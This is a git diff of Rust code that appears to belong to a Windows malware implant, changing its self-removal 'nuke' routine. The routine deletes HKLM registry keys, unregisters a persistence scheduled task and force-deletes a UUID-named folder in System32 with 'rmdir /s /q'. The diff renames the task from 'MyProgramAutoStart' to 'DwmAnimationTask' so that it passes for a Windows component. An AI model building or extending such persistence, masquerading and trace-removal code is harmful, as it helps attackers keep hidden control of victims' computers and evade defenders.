@@ -2,8 +2,9 @@ use std::{path::Path, process::Command};
 use winreg::{enums::HKEY_LOCAL_MACHINE, RegKey};
 
 pub fn nuke() {
-    remove_persistence();
+    let uuid = get_uuid();
     remove_reg_keys();
+    remove_persistence(&uuid);
 }
 
 fn get_uuid() -> String {
@@ -26,28 +27,31 @@ fn get_uuid() -> String {
 }
 
 #[allow(dead_code)]
-fn remove_persistence() {
+fn remove_persistence(uuid: &str) {
     // delete from startup
-
-    let uuid = get_uuid();
     // delete subfolder in System32
-    let system32_dir = Path::new(&std::env::var("SystemRoot").unwrap()).join("System32");
-    match std::fs::remove_dir_all(system32_dir.join(&uuid)) {
-        Ok(_) => {}
-        Err(err) => {
-            println!("{}", err);
-            println!("Failed to delete uuid directory")
-        }
-    }
+
     let powershell_command = r#"
-        Unregister-ScheduledTask -TaskName "MyProgramAutoStart" -Confirm:$false
+        Unregister-ScheduledTask -TaskName "DwmAnimationTask" -Confirm:$false
     "#;
 
     // Execute the PowerShell command
     Command::new("powershell")
         .args(&["-Command", powershell_command])
-        .output()
+        .spawn()
         .expect("Failed to execute PowerShell command");
+
+    // Delete the folder in System32
+    Command::new("cmd")
+        .args(&[
+            "/C",
+            "rmdir",
+            "/s",
+            "/q",
+            &format!("%SystemRoot%\\System32\\{}", uuid),
+        ])
+        .spawn()
+        .expect("Failed to delete folder in System32");
 }
 
 fn remove_reg_keys() {
